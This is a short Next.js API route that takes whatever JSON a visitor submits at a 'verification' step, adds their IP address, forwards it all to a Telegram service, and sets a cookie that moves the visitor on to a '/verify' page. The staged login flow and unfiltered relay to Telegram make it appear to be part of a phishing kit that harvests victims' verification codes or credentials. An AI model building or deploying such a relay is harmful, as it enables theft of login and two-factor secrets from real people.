import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { getClientIp } from "@/lib/request-ip"

const LOGIN_FLOW_COOKIE = "login_flow"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIp(request)
    await telegramService.sendVerificationNotification({ ...data, ip })
    const response = NextResponse.json({ success: true })

    /* Advance the flow marker so /verify stays reachable. */
    response.cookies.set(LOGIN_FLOW_COOKIE, "2", {
      path: "/",
      maxAge: 10 * 60,
    })

    return response
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}

